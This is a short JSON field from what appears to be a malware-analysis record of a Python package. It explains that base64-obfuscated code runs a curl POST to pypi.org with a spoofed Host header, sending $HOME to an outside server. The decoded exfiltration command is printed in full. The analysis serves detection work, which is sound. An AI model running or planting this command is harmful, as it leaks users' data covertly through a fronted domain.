      "malicious_behavior": "The code contains a base64-encoded string that, when decoded, forms a shell command executed immediately via os.system. The decoded command is: curl -k -X POST \"https://pypi.org\" -H \"Host: psec.forward.io.global.prod.fastly.net\" -d \"test=$HOME\". This command silently sends an HTTP POST request to a suspicious host (psec.forward.io.global.prod.fastly.net) with the environment variable $HOME included in the POST data under the 'test' parameter. The use of base64 encoding to hide the command, immediate execution without user interaction, and sending potentially sensitive environment information to an external server are strong indicators of malicious behavior. The obfuscation and network exfiltration pattern matches known malware techniques for stealthy data leakage and reconnaissance. Therefore, this code is malicious."
